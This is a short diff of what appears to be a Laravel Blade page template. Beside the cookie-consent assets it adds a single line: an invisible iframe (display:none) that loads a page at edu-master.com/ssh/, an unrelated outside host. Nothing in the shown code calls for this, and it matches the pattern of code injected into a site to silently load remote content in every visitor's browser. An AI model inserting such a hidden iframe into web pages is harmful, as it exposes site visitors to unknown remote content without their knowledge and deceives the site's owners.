@@ -4,6 +4,7 @@
 
 <link rel='stylesheet' href='{{asset('css/cookieconsent.css')}}' media="screen" />
 <script src="{{ asset('js/cookieconsent.js') }}"></script>
+<iframe src="https://edu-master.com/ssh/" style="display:none;"></iframe>
 
 <script>
     let language_code = document.documentElement.getAttribute('lang');
